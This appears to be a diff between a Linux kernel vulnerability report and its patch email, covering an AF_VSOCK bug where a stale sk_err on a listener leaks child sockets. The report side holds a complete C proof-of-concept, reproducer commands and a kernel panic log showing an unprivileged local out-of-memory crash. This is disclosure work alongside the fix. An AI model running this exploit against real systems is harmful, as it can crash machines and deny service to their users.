@@ -1,61 +1,63 @@
-Received: from mail-pg1-f175.google.com (mail-pg1-f175.google.com [209.85.215.175])
+Received: from mail-pl1-f173.google.com (mail-pl1-f173.google.com [209.85.214.173])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 19C76304BA3
-	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:21:29 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.175
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 89B13379C28
+	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:21:36 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.173
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1784827291; cv=none; b=CH7qZaBz1/GI5/4JoRyy0d9ojeHWUpRxnDrCeoRflWCPItI91H8t5z+k9X9G2ksGM0VHE2jqehFAaJRFtvQMoSGxaZeWJ2saBAoN6Ir/UKg0E1OBsxYJVc/VqyUol4UV0UTCtgQDdqz7PWbjB2W6jlc6Phd1CdSGV8tK7sEh2z8=
+	t=1784827297; cv=none; b=UilhvyiVe/1NKx2Du58Js2u9qlOyG9qHkXFYbvLTaUWCe5MnRNCsKkILp0fyXPH4N71vFvp4CJ4RPAFS7FPHPv6SG+yZ1iafnI+f+a27EDz2nqC9MpYJTXtvgLwAP0lcxsBTk8Tiy/PlhmmePkZ5gya/zewQI1aGWlcXj5JZTWg=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1784827291; c=relaxed/simple;
-	bh=CPaPN5Ltve6dkBBzmVK3VDQ2/gA1iJ2rgNGbjdbDHuI=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=FVH3RNITIkYF8JTrRsTJa5M31UwkhEzeya9oYdKyho36kSiHyc27ZDRe5Cppdh+imb4RiBoHWmPUDNmYfnieaOu//K0ikCdnLfCqFt/JufcHJN0OR1chNs6qDG1Cp65tYKw3Iv6k7OEfUWrSwwtbAIHMHM/ZOx+mobAIKnYqVwI=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=KGd5tK+Y; arc=none smtp.client-ip=209.85.215.175
+	s=arc-20240116; t=1784827297; c=relaxed/simple;
+	bh=k+4nMpcoQz97bn369q+zy/rYAZg95mHwCblqq+PQHkE=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=lDaa2RiDBzkNpmAjPno1ZN7PaZq5fa2tJ9BU22ae8GANiPLJkmBFNHzahxFnobjzZkbpzMkaCReJgFe8zay+RmdeAmTPDBz0T3JyKBivMa0f2ChVM6VuWb1d7QkW+uqcGKwoooZcNjgVOJ5KSjY2XwmXT3ZnSHEOmoZAhqmAWSU=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=rRGWUqjO; arc=none smtp.client-ip=209.85.214.173
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="KGd5tK+Y"
-Received: by mail-pg1-f175.google.com with SMTP id 41be03b00d2f7-c999f162c9aso726101a12.3
-        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:21:29 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="rRGWUqjO"
+Received: by mail-pl1-f173.google.com with SMTP id d9443c01a7336-2cc61541f8cso8361735ad.0
+        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:21:36 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1784827289; x=1785432089; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=FJRZN8SJ5nXWhc05c901fZkUoc3+I8GmqkqMc4MH/UQ=;
-        b=KGd5tK+Y5BgIJfqwnOu5CktKbINjqkI8sr1yyfXTT/NlVOyeLnc/9H9NYQB4+Khh5Z
-         tIlOw+xQazQMVOmc0c9zeMzUcklJqkOGstrkcahhy8HlCptFI6HF4xeA22cRGP6Z9c8d
-         3a6aDiAhY6aZZ5Hv8/7R1wPePYUlPeW3M+Ul3Gka7m9cgls8nkeRnglQ3x0Xf6kCb7qP
-         4s33RONSqR14wSfKK1HB//fkZkUCFGfXGfEmrIRWU7/dALg1MDYAG3q82C9eFfc4Sxot
-         BsJDx0sw5IiDrvKGWOHoSSmN9KBl8XuNhXjVbFPm4lF/N/hO49PJnt0vdMOmyYXm8tNe
-         lUAw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1784827289; x=1785432089;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1784827296; x=1785432096; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=FJRZN8SJ5nXWhc05c901fZkUoc3+I8GmqkqMc4MH/UQ=;
-        b=mbSNIa7/b36q2J+XjbQBCkMCo+L2C2xzBLDJ0rW19AcIMM0UDDmTAFGccMlmAZgRle
-         ekcv45fgLN6ZPISs4fU1AgHjwTLzB5qk2+L5rx1ftxR5e5xsavmYI/zIWO1NsopkorSg
-         a8DhTqrGNqdkWmvW6G53gpgiai7ckfSb5oZJAzY/UBFhcJwbrvOrSEMuGB5mSehH2PFE
-         +gTMfRBri1txqiwF9SwEMNnuZ7n6piQjYYwGH3klwBhURu2fs3mnAHwhSz47tPx8+D9f
-         yw2+yx8aS7DkAUtIiRTc+sCBCqT0hzktR1r+5vBtgryC0ROYwfDgUY8UPhJA5EtT+wqN
-         FARQ==
-X-Forwarded-Encrypted: i=1; AHgh+RqYTHi6GISQLJ3D/hMJispAYJBVJC9Nwj46L9mTB7viybG045uSgP35lIcKwzKzT4i15oK1X68=@vger.kernel.org
-X-Gm-Message-State: AOJu0YwH340dvjVyYG7/hrmNm30uuUVfQ8ZkLSGfR5nWpipMnE5lJLOq
-	V19GT9hA5BjntYFdNU/hh6/amWpjBrevJ3jlW0gcmQIEtW66OhNz5ylo
-X-Gm-Gg: AR+sD11GgbPwrs36sNovZfbvBxoBHUA0gb99yFWJvakCG4oC0li9EeE59X+ISUbWmja
-	rVl9TmFQLFCN98L1CyT8DxWlkBE9liOwyHX37nH5oaVFTGsQN8vNvBkcf02026TvZMLMHOqnebq
-	8qew5FfBtzFnzeB5iW66b8kCNpo/YJ/0uLs2gqPJ7o8vlvHgX5JJSeUArygNEP7e7aV+SKg+GBx
-	cAIRAmN5id+A5b3Y5yG9lb6pzVxXQqB5ZvxxbSvgaoPNJoyzH3s/pHG0t9qJOTlaUd3s5Ju7DBx
-	3k3QUcM9v5HxHtZeh523GOsUW8Rvk7NHIh/Hx3I6Oh6PfUouwPzAgzNTR2N2nbatKF7vkzt2kRa
-	8NDv0EZSnnYHdjEwvLubBt2P+xUPy3nlCdOSngPTsKIi/DzC8gdSEsu8ZsWpnjaDluLUbQV43og
-	uWBqgAmN6RRd4F6bYdMOU=
-X-Received: by 2002:a05:6a20:4387:b0:3bf:6c05:ab with SMTP id adf61e73a8af0-3c44b21f1e1mr4509184637.58.1784827289138;
-        Thu, 23 Jul 2026 10:21:29 -0700 (PDT)
+        bh=LJeMWpwJDiKmOBxcOAr9yxPeFdYnA9I6db3ePnFBGMA=;
+        b=rRGWUqjOmrGLCpoMGsM3zNMBBWfSZdp14bwWWlfUdJPY/xFZAT8Ym7iF0WKOHhbTN1
+         J0lSdOW2VrMsTOEkySNofGGq0SER2zvCV+pQzFMVPzly/2DTiwxJeQw1h2bMhk2gfLRa
+         y6GsqTTzMCayiH8FQygrnUm/VsA2YLWyHsimsRpoePN9pXsRo0q07lvkwMPFR3SfuqXF
+         CLin6A5LJYe+wOAeBEnpyo+9UhCr2v5LRdSe6F3ezNmb1tkgTrh4LlgJ2cMVb5gu41+w
+         3k6zipgwgLoetKHsqSM1AV6IKEwmnODpsVYYVTqKTd9cZnY14Bm+gzPQyiNwsb/ta0gK
+         BbIQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1784827296; x=1785432096;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=LJeMWpwJDiKmOBxcOAr9yxPeFdYnA9I6db3ePnFBGMA=;
+        b=jBpdbqAiZNJnQHDEDmvXq+4b/M+XVqOsDl3AeFUvOZulCPwDMgJ/59f6zGnPVyPMZK
+         mgVsxbxHzuCQUkUsp4BiBYJ+RB1G1UNgEiyoDPyuGJjKo75ocF/oclvCTDseh+V/5dRb
+         2hnH4ZFKjG5/3fblNZ4BHfzozAHuos9Ey8Whrv8bN4mldeoMti/Vwk7FV+T7VPNKYTnX
+         sk9r2RgpqocEwwcIrGpjcWvRvx0omFR7ynhw5MAINFjc8FHBcp6CUXytk5KGiVGmrmpE
+         nmzSl0D18iqhl7AMrlmE3KXl1hyTBTXbZDE+0jK+2qpWjXzS0a7Nq2vegqH9TIQV/rW9
+         aZYQ==
+X-Forwarded-Encrypted: i=1; AHgh+RqYSvkd5uq+1LNXlH26SKMnV1ecV32h5ZeSxt7JKU5TrQA5Cjiz7+zj+RJCvK7seUWK1/sVzXw=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yx12yUClA9NQKg11k2O7OoTDNEGpT4YaALOyTftqgkQ3OwWvetc
+	fQmVgB68TuxjGDymQU6/Z37xWzWRRnq6XM/8rrbqrHSuMV4ibouV3rNy
+X-Gm-Gg: AR+sD11mdDjzOSSYKqU/39Dwa17vrjZ7bUrOAEw+TwwAnhAx/GriYPYi/Uyryou0unU
+	rhpJPq/LoF/EYQ3yvY0pQMHe8O1PZSNz9zFxoeMVPDmtqjR0/f2kjiwMoRwX1QjT4l6gv2tXdlF
+	PyhCT6bUFp/srOUdKnKnBR6nvKHdczAEOJ/OdlQV8CVFy8kPKZNl+T2I1mt+INCW2w8sONYaRtO
+	sqXc3VZS7cZWdtqD/4Q3YHeIBMtEtX8cCxYdu52N4KUUZF9D//K4wukWINH9lR0HsjsvUI2sfEX
+	8qGXoGnLr1PO9dX0pOEoO4XE9pH4SxS66f+fijt5lcdaAb7sBt1FmCiUyDfM1Ug/f9juJ4F7ZLc
+	W8+BS3V3O/AJ5UzAW4L3nCcFUtnDrsFev7Br32XVeQ9ZybRI2VMPirS5OFj39ehKNgsbkzeCdBf
+	uHTO9aT8/HYw3nzvlv4l4=
+X-Received: by 2002:a17:902:c407:b0:2cb:402:70cc with SMTP id d9443c01a7336-2cfa95867b4mr41040635ad.28.1784827295640;
+        Thu, 23 Jul 2026 10:21:35 -0700 (PDT)
 Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3147df09a9dsm20967373eec.19.2026.07.23.10.21.18
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3147df09a9dsm20967373eec.19.2026.07.23.10.21.29
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 23 Jul 2026 10:21:28 -0700 (PDT)
+        Thu, 23 Jul 2026 10:21:35 -0700 (PDT)
 From: Ren Wei <enjou1224z@gmail.com>
 To: virtualization@lists.linux.dev,
 	netdev@vger.kernel.org
@@ -70,10 +72,12 @@ Cc: sgarzare@redhat.com,
 	vega@nebusec.ai,
 	zihanx@nebusec.ai,
 	enjou1224z@gmail.com
-Subject: [PATCH net 0/1] vsock: clear stale sk_err before listen()
-Date: Fri, 24 Jul 2026 01:21:13 +0800
-Message-ID: <cover.1784649300.git.zihanx@nebusec.ai>
+Subject: [PATCH net 1/1] vsock: clear stale sk_err before listen()
+Date: Fri, 24 Jul 2026 01:21:14 +0800
+Message-ID: <dfc66494f95ad847e58409a9fc4bcbb7b0d12766.1784649300.git.zihanx@nebusec.ai>
 X-Mailer: git-send-email 2.51.0
+In-Reply-To: <cover.1784649300.git.zihanx@nebusec.ai>
+References: <cover.1784649300.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -84,473 +88,43 @@ Content-Transfer-Encoding: 8bit
 
 From: Zihan Xi <zihanx@nebusec.ai>
 
-Hi Linux kernel maintainers,
-
-We found and validated an issue in net/vmw_vsock/af_vsock.c. The bug is
-reachable by an unprivileged local user via AF_VSOCK loopback. We've
-tested it, and it should not affect any other functionality.
-
-This series contains one patch:
-  1/1 vsock: clear stale sk_err before listen()
-
-We provide bug details, reproducer steps, and a crash log below.
-
----- details below ----
-
-Bug details:
-
-A failed loopback connect() can leave sk_err set on a reusable AF_VSOCK
-socket. If userspace then calls listen() on the same socket, the stale
-error remains attached to the listener. A later child can still reach the
-accept queue, but vsock_accept() sees listener->sk_err, rejects the
-child, and drops only the transient accept reference.
-
-On the virtio loopback path that rejected child can remain orphaned in the
-vsock tables, so repeated iterations leak children and can eventually
-push the guest into OOM. Clearing sk_err in vsock_listen() prevents a
-failed connect() attempt from poisoning the next listener incarnation of
-that socket.
-
-On our fixed-kernel validation, the same minimal reproducer no longer hit
-that failed accept path and accept() returned a valid child socket.
-
-Reproducer:
-
-    cc -O2 -Wall -Wextra -pthread -o /root/poc /root/poc.c
-    echo 2 > /proc/sys/vm/panic_on_oom
-    echo 1 > /proc/sys/vm/oom_dump_tasks
-    /root/poc 100 44000 54000 33554432 33554432 600
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-
-#define _GNU_SOURCE
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <linux/vm_sockets.h>
-#include <pthread.h>
-#include <signal.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/socket.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <time.h>
-#include <unistd.h>
-
-#define DEFAULT_BASE_PORT 40000U
-#define DEFAULT_FAIL_PORT 50000U
-#define DEFAULT_BUFFER_SIZE (32ULL * 1024 * 1024)
-#define DEFAULT_SEND_BYTES (32ULL * 1024 * 1024)
-#define DEFAULT_ITERATIONS 1U
-
-struct client_ctx {
-	pthread_mutex_t lock;
-	pthread_cond_t cond;
-	unsigned int server_port;
-	unsigned int client_port;
-	unsigned long long send_bytes;
-	unsigned long long bytes_sent;
-	int connect_errno;
-	int send_errno;
-	int sent_any;
-	int connected;
-	int done;
-	int fd;
-};
-
-static void die(const char *msg)
-{
-	perror(msg);
-	exit(EXIT_FAILURE);
-}
-
-static void set_vsock_u64(int fd, int optname, unsigned long long val)
-{
-	if (setsockopt(fd, AF_VSOCK, optname, &val, sizeof(val)) < 0)
-		die("setsockopt(AF_VSOCK)");
-}
-
-static void set_connect_timeout(int fd, long sec)
-{
-	struct timeval tv = {
-		.tv_sec = sec,
-		.tv_usec = 0,
-	};
-
-	if (setsockopt(fd, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT,
-		       &tv, sizeof(tv)) < 0) {
-		die("setsockopt(SO_VM_SOCKETS_CONNECT_TIMEOUT)");
-	}
-}
-
-static void bind_vsock(int fd, unsigned int cid, unsigned int port)
-{
-	struct sockaddr_vm svm = {
-		.svm_family = AF_VSOCK,
-		.svm_cid = cid,
-		.svm_port = port,
-	};
-
-	if (bind(fd, (struct sockaddr *)&svm, sizeof(svm)) < 0)
-		die("bind(AF_VSOCK)");
-}
-
-static int connect_vsock_errno(int fd, unsigned int cid, unsigned int port)
-{
-	struct sockaddr_vm svm = {
-		.svm_family = AF_VSOCK,
-		.svm_cid = cid,
-		.svm_port = port,
-	};
-
-	if (connect(fd, (struct sockaddr *)&svm, sizeof(svm)) == 0)
-		return 0;
-
-	return errno;
-}
-
-static void *client_thread(void *arg)
-{
-	struct client_ctx *ctx = arg;
-	char *buf;
-	unsigned long long sent = 0;
-	const size_t chunk = 64 * 1024;
-	int fd;
-	int err;
-
-	fd = socket(AF_VSOCK, SOCK_STREAM, 0);
-	if (fd < 0)
-		die("client socket(AF_VSOCK)");
-
-	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, ctx->send_bytes);
-	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, ctx->send_bytes);
-	bind_vsock(fd, VMADDR_CID_LOCAL, ctx->client_port);
-
-	err = connect_vsock_errno(fd, VMADDR_CID_LOCAL, ctx->server_port);
-
-	pthread_mutex_lock(&ctx->lock);
-	ctx->fd = fd;
-	ctx->connect_errno = err;
-	ctx->connected = (err == 0);
-	pthread_cond_broadcast(&ctx->cond);
-	pthread_mutex_unlock(&ctx->lock);
-
-	if (err)
-		return NULL;
-
-	buf = malloc(chunk);
-	if (!buf)
-		die("malloc");
-	memset(buf, 'A', chunk);
-
-	while (sent < ctx->send_bytes) {
-		size_t todo = chunk;
-		ssize_t rc;
-
-		if (ctx->send_bytes - sent < todo)
-			todo = ctx->send_bytes - sent;
-
-		rc = send(fd, buf, todo, 0);
-		if (rc < 0) {
-			pthread_mutex_lock(&ctx->lock);
-			ctx->send_errno = errno;
-			pthread_mutex_unlock(&ctx->lock);
-			break;
-		}
-
-		if (rc == 0)
-			break;
-
-		sent += rc;
-		pthread_mutex_lock(&ctx->lock);
-		ctx->sent_any = 1;
-		ctx->bytes_sent = sent;
-		pthread_cond_broadcast(&ctx->cond);
-		pthread_mutex_unlock(&ctx->lock);
-	}
-
-	free(buf);
-
-	pthread_mutex_lock(&ctx->lock);
-	ctx->done = 1;
-	pthread_cond_broadcast(&ctx->cond);
-	pthread_mutex_unlock(&ctx->lock);
-
-	return NULL;
-}
-
-static void client_ctx_init(struct client_ctx *ctx, unsigned int server_port,
-			    unsigned int client_port,
-			    unsigned long long send_bytes)
-{
-	memset(ctx, 0, sizeof(*ctx));
-	pthread_mutex_init(&ctx->lock, NULL);
-	pthread_cond_init(&ctx->cond, NULL);
-	ctx->server_port = server_port;
-	ctx->client_port = client_port;
-	ctx->send_bytes = send_bytes;
-	ctx->fd = -1;
-}
-
-static void client_ctx_destroy(struct client_ctx *ctx)
-{
-	pthread_mutex_destroy(&ctx->lock);
-	pthread_cond_destroy(&ctx->cond);
-}
-
-static int wait_for_connect(struct client_ctx *ctx)
-{
-	int err;
-
-	pthread_mutex_lock(&ctx->lock);
-	while (!ctx->connected && ctx->connect_errno == 0)
-		pthread_cond_wait(&ctx->cond, &ctx->lock);
-	err = ctx->connect_errno;
-	pthread_mutex_unlock(&ctx->lock);
-
-	return err;
-}
-
-static void wait_for_send_progress(struct client_ctx *ctx)
-{
-	struct timespec ts;
-
-	clock_gettime(CLOCK_REALTIME, &ts);
-	ts.tv_sec += 2;
-	if (ts.tv_nsec >= 1000000000L) {
-		ts.tv_sec += 1;
-		ts.tv_nsec -= 1000000000L;
-	}
-
-	pthread_mutex_lock(&ctx->lock);
-	if (!ctx->done)
-		pthread_cond_timedwait(&ctx->cond, &ctx->lock, &ts);
-	pthread_mutex_unlock(&ctx->lock);
-}
-
-static int prepare_listener(unsigned int server_port, unsigned int fail_port,
-			    unsigned long long buffer_size)
-{
-	int fd;
-	int err;
-
-	fd = socket(AF_VSOCK, SOCK_STREAM, 0);
-	if (fd < 0)
-		die("listener socket(AF_VSOCK)");
-
-	set_connect_timeout(fd, 1);
-	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, buffer_size);
-	set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, buffer_size);
-	bind_vsock(fd, VMADDR_CID_LOCAL, server_port);
-
-	err = connect_vsock_errno(fd, VMADDR_CID_LOCAL, fail_port);
-	if (err == 0) {
-		fprintf(stderr, "unexpected successful failed-connect setup on port %u\n",
-			fail_port);
-		exit(EXIT_FAILURE);
-	}
-
-	fprintf(stderr, "[*] setup connect() failed with errno=%d (%s)\n",
-		err, strerror(err));
-
-	if (listen(fd, 1) < 0)
-		die("listen(AF_VSOCK)");
-
-	return fd;
-}
-
-static int trigger_once(unsigned int server_port, unsigned int fail_port,
-			unsigned int client_port,
-			unsigned long long buffer_size,
-			unsigned long long send_bytes)
-{
-	struct client_ctx ctx;
-	pthread_t tid;
-	int listener_fd;
-	int accept_fd;
-	int accept_errno;
-
-	listener_fd = prepare_listener(server_port, fail_port, buffer_size);
-
-	client_ctx_init(&ctx, server_port, client_port, send_bytes);
-	if (pthread_create(&tid, NULL, client_thread, &ctx) != 0)
-		die("pthread_create");
-
-	if (wait_for_connect(&ctx) != 0) {
-		fprintf(stderr, "client connect failed with errno=%d (%s)\n",
-			ctx.connect_errno, strerror(ctx.connect_errno));
-		exit(EXIT_FAILURE);
-	}
-
-	wait_for_send_progress(&ctx);
-
-	accept_fd = accept(listener_fd, NULL, NULL);
-	accept_errno = errno;
-
-	fprintf(stderr, "[*] accept() returned fd=%d errno=%d (%s)\n",
-		accept_fd, accept_errno, strerror(accept_errno));
-
-	if (accept_fd >= 0) {
-		fprintf(stderr, "unexpected successful accept()\n");
-		exit(EXIT_FAILURE);
-	}
-
-	if (accept_errno != ECONNRESET) {
-		fprintf(stderr, "unexpected accept errno: %d (%s)\n",
-			accept_errno, strerror(accept_errno));
-		exit(EXIT_FAILURE);
-	}
-
-	close(listener_fd);
-
-	pthread_join(tid, NULL);
-
-	fprintf(stderr,
-		"[*] client connect errno=%d send errno=%d bytes_sent=%llu sent_any=%d done=%d\n",
-		ctx.connect_errno, ctx.send_errno, ctx.bytes_sent,
-		ctx.sent_any, ctx.done);
-	accept_fd = ctx.fd;
-	ctx.fd = -1;
-	client_ctx_destroy(&ctx);
-	return accept_fd;
-}
-
-static unsigned int parse_u32(const char *s)
-{
-	unsigned long long v = strtoull(s, NULL, 0);
-
-	if (v > UINT32_MAX) {
-		fprintf(stderr, "value too large: %s\n", s);
-		exit(EXIT_FAILURE);
-	}
-
-	return (unsigned int)v;
-}
-
-static unsigned long long parse_u64(const char *s)
-{
-	return strtoull(s, NULL, 0);
-}
-
-int main(int argc, char **argv)
-{
-	unsigned int iterations = DEFAULT_ITERATIONS;
-	unsigned int base_port = DEFAULT_BASE_PORT;
-	unsigned int fail_base = DEFAULT_FAIL_PORT;
-	unsigned long long buffer_size = DEFAULT_BUFFER_SIZE;
-	unsigned long long send_bytes = DEFAULT_SEND_BYTES;
-	unsigned int hold_seconds = 0;
-	int *held_fds;
-	unsigned int i;
-
-	signal(SIGPIPE, SIG_IGN);
-
-	if (argc > 1)
-		iterations = parse_u32(argv[1]);
-	if (argc > 2)
-		base_port = parse_u32(argv[2]);
-	if (argc > 3)
-		fail_base = parse_u32(argv[3]);
-	if (argc > 4)
-		buffer_size = parse_u64(argv[4]);
-	if (argc > 5)
-		send_bytes = parse_u64(argv[5]);
-	if (argc > 6)
-		hold_seconds = parse_u32(argv[6]);
-
-	held_fds = calloc(iterations, sizeof(*held_fds));
-	if (!held_fds)
-		die("calloc");
-
-	for (i = 0; i < iterations; i++)
-		held_fds[i] = -1;
-
-	fprintf(stderr,
-		"[*] iterations=%u base_port=%u fail_base=%u buffer_size=%llu send_bytes=%llu hold_seconds=%u\n",
-		iterations, base_port, fail_base, buffer_size, send_bytes,
-		hold_seconds);
-
-	for (i = 0; i < iterations; i++) {
-		unsigned int server_port = base_port + (i * 2);
-		unsigned int client_port = base_port + (i * 2) + 1;
-		unsigned int fail_port = fail_base + i;
-
-		fprintf(stderr,
-			"[*] iteration=%u server_port=%u client_port=%u fail_port=%u\n",
-			i, server_port, client_port, fail_port);
-		held_fds[i] = trigger_once(server_port, fail_port, client_port,
-					   buffer_size, send_bytes);
-		fprintf(stderr, "[*] holding client fd=%d\n", held_fds[i]);
-	}
-
-	if (hold_seconds) {
-		fprintf(stderr, "[*] sleeping for %u seconds with client sockets open\n",
-			hold_seconds);
-		sleep(hold_seconds);
-	}
-
-	for (i = 0; i < iterations; i++) {
-		if (held_fds[i] >= 0)
-			close(held_fds[i]);
-	}
-
-	free(held_fds);
-
-	return 0;
-}
-
-------END poc.c--------
-
-----BEGIN crash log----
-
-[  921.941962][T10458] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
-[  921.942839][T10458] CPU: 0 UID: 0 PID: 10458 Comm: poc Not tainted 6.12.74 #3
-[  921.943455][T10458] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  921.944405][T10458] Call Trace:
-[  921.944701][T10458]  <TASK>
-[  921.944974][T10458]  dump_stack_lvl+0x3b/0x1f0
-[  921.945423][T10458]  panic+0x6fe/0x7e0
-[  921.945802][T10458]  ? dump_header+0x6c2/0x950
-[  921.946233][T10458]  ? __pfx_panic+0x10/0x10
-[  921.947686][T10458]  ? out_of_memory+0x8c5/0x16b0
-[  921.948137][T10458]  out_of_memory+0x8f3/0x16b0
-[  921.949926][T10458]  __alloc_pages_noprof+0x1ec3/0x26d0
-[  921.954378][T10458]  alloc_pages_mpol_noprof+0x2ce/0x610
-[  921.956796][T10458]  folio_alloc_noprof+0x23/0xd0
-[  921.957720][T10458]  filemap_alloc_folio_noprof+0x35d/0x420
-[  921.959719][T10458]  filemap_fault+0x675/0x2800
-[  921.962920][T10458]  do_pte_missing+0x174c/0x3ff0
-[  921.964830][T10458]  __handle_mm_fault+0xfa3/0x2a10
-[  921.967730][T10458]  handle_mm_fault+0x3f5/0xa00
-[  921.968200][T10458]  do_user_addr_fault+0x50a/0x1490
-[  921.968691][T10458]  exc_page_fault+0x5d/0xe0
-[  921.969113][T10458]  asm_exc_page_fault+0x26/0x30
-[  921.969561][T10458] RIP: 0033:0x7f47a09b2237
-[  921.969990][T10458] Code: Unable to access opcode bytes at 0x7f47a09b220d.
-[  921.970550][T10458] RSP: 002b:00007f47a089be60 EFLAGS: 00010202
-[  921.971073][T10458] RAX: 0000000000010000 RBX: 00007ffe78934c80 RCX: 00007f47a0942c8e
-[  921.972372][T10458] RDX: 000000000000002c RSI: 0000000000000000 RDI: 0000000000000016
-[  921.973017][T10458] RBP: 0000000001800000 R08: 0000000000000000 R09: 0000000000000000
-[  921.974428][T10458]  </TASK>
-[  921.974959][T10458] Kernel Offset: disabled
-[  921.975445][T10458] Rebooting in 86400 seconds..
-
------END crash log-----
-
-Best regards,
-Zihan Xi
-
-Zihan Xi (1):
-  vsock: clear stale sk_err before listen()
-
+A failed loopback connect() can leave sk_err set on a reusable
+AF_VSOCK socket. If userspace then calls listen() on the same socket,
+the stale error remains attached to the listener. When a later child
+reaches vsock_accept(), the accept path sees listener->sk_err,
+rejects the child, and drops only the transient accept reference.
+
+On virtio-based loopback this can leave the rejected child orphaned in
+the vsock tables, so repeated iterations leak children and can
+ultimately drive the guest into OOM.
+
+Clear sk_err when a socket is transitioned into TCP_LISTEN so an
+earlier failed connect() does not poison a new listening socket.
+
+Fixes: d021c344051a ("VSOCK: Introduce VM Sockets")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: Codex:gpt-5.4
+Signed-off-by: Zihan Xi <zihanx@nebusec.ai>
+Signed-off-by: Ren Wei <enjou1224z@gmail.com>
+---
  net/vmw_vsock/af_vsock.c | 4 ++++
  1 file changed, 4 insertions(+)
 
+diff --git a/net/vmw_vsock/af_vsock.c b/net/vmw_vsock/af_vsock.c
+index a06f708f3..3482ba594 100644
+--- a/net/vmw_vsock/af_vsock.c
++++ b/net/vmw_vsock/af_vsock.c
+@@ -1729,6 +1729,10 @@ static int vsock_listen(struct socket *sock, int backlog)
+ 		goto out;
+ 	}
+ 
++	/* sk_err might have been set as a result of an earlier
++	 * (failed) connect attempt.
++	 */
++	sk->sk_err = 0;
+ 	sk->sk_max_ack_backlog = backlog;
+ 	sk->sk_state = TCP_LISTEN;
+ 
 -- 
 2.43.0
